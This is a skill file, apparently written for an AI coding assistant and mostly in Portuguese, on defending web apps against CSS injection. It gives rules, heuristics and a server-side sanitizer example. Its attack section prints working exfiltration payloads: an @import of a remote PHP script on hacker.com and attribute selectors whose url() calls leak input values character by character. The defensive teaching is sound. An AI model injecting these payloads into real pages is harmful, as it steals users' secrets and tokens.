---
name: rs-seguranca-devs-css-sniffer
description: "Guards against CSS injection vulnerabilities when reviewing or writing front-end code. Use when user asks to 'review security', 'sanitize input', 'allow custom CSS', 'theme customization', 'user-provided styles', or any feature accepting CSS from users. Ensures CSS inputs are validated with same rigor as HTML/JavaScript. Make sure to use this skill whenever code accepts user-controlled CSS, style attributes, theme names, or color values. Not for general XSS prevention, SQL injection, or backend security."
---

# CSS Injection (CSS Sniffer)

> Valide entradas CSS com o mesmo rigor aplicado a HTML e JavaScript — CSS tambem exfiltra dados.

## Rules

1. **Nunca confie em CSS vindo do cliente** — `@import`, `url()`, e seletores de atributo permitem exfiltrar dados sensiveis sem executar JavaScript
2. **Valide no servidor, nunca apenas no cliente** — o usuario troca `input type="color"` por `textarea` no DevTools e envia CSS arbitrario, porque o cliente e territorio do atacante
3. **Bloqueie `@import` e `url()` em CSS do usuario** — estas propriedades fazem requisicoes externas que vazam informacoes para servidores do atacante
4. **Trate nomes de tema como enum, nao como string livre** — se o valor vai para `@import url(theme-name.css)`, valide contra uma lista fixa, porque strings livres permitem injetar URLs externas
5. **Seletores de atributo CSS leem valores de inputs** — `input[value^="secret"]` combinado com `background: url(hacker.com/secret)` exfiltra conteudo caractere por caractere
6. **CSS tambem tem seletores de conteudo** — alem de atributos, filtros de conteudo CSS permitem ler texto visivel na pagina

## Como funciona o ataque

### Vetor: `@import` com PHP dinamico

```css
/* CSS injetado pelo atacante */
@import url("http://hacker.com/inject.php");
```

```php
/* inject.php - gera CSS que exfiltra valores */
<?php
header("Content-Type: text/css");
for ($i = 0; $i < 10000; $i++) {
    echo "input[value=\"$i\"] { background: url(\"http://hacker.com/$i.png\"); }\n";
}
?>
```

O navegador tenta carregar `http://hacker.com/1234.png` — o atacante ve nos logs qual valor o input contem.

### Vetor: seletores de atributo granulares

```css
input[value^="a"] { background: url("http://hacker.com/starts-a.png"); }
input[value^="ab"] { background: url("http://hacker.com/starts-ab.png"); }
input[value$="z"] { background: url("http://hacker.com/ends-z.png"); }
```

Combinatoria de prefixos e sufixos reconstroi o valor completo.

## Example

**Before (vulneravel):**
```typescript
// Servidor aceita CSS do usuario sem validacao
app.post('/settings', (req, res) => {
  const customCss = req.body.headerCss // string livre
  db.save({ userId: req.user.id, css: customCss })
})

// Template renderiza direto
<style>${user.customCss}</style>
<input type="text" value="${apiToken}" />
```

**After (com esta skill aplicada):**
```typescript
// Servidor valida CSS com allowlist de propriedades
import { sanitizeCss } from './css-sanitizer'

app.post('/settings', (req, res) => {
  const sanitizedCss = sanitizeCss(req.body.headerCss, {
    allowedProperties: ['color', 'background-color', 'font-size', 'margin', 'padding'],
    blockAtRules: true,     // bloqueia @import, @font-face
    blockUrls: true,        // bloqueia url() em qualquer propriedade
    blockSelectors: ['[value', '[data-'] // bloqueia seletores de atributo
  })
  db.save({ userId: req.user.id, css: sanitizedCss })
})
```

## Heuristics

| Situacao | Acao |
|----------|------|
| Campo "cor personalizada" (color picker) | Validar como hex `/^#[0-9a-fA-F]{6}$/` no servidor |
| Campo "CSS customizado" no admin | Allowlist de propriedades, bloquear `@import`, `url()`, seletores de atributo |
| Nome de tema usado em `@import` | Validar contra enum fixo de temas permitidos |
| Atributo `style` editavel pelo usuario | Parsear e permitir apenas propriedades visuais seguras |
| Qualquer input que vira CSS | Tratar com mesmo rigor de sanitizacao de HTML |

## Anti-patterns

| Nunca faca | Faca em vez disso |
|------------|-------------------|
| `<style>${userInput}</style>` sem sanitizar | Parsear CSS, aplicar allowlist de propriedades |
| `@import url(${themeName}.css)` com string livre | Validar `themeName` contra `['light', 'dark', 'blue']` |
| Validar `type="color"` apenas no client | Validar formato hex no servidor: `/^#[0-9a-fA-F]{6}$/` |
| Confiar que `input type="color"` envia apenas cores | O usuario troca o tipo no DevTools e envia CSS arbitrario |
| Sanitizar apenas HTML e JS, ignorar CSS | CSS exfiltra dados via `url()` e seletores de atributo |

## Deep reference library

- [deep-explanation.md](references/deep-explanation.md) — Raciocínio completo do instrutor, analogias e edge cases
- [code-examples.md](references/code-examples.md) — Todos os exemplos de código expandidos com variações


---

## Deep dive
- [Deep explanation](../../../data/skills/seguranca-para/rs-seguranca-para-devs-css-sniffer/references/deep-explanation.md)
- [Code examples](../../../data/skills/seguranca-para/rs-seguranca-para-devs-css-sniffer/references/code-examples.md)
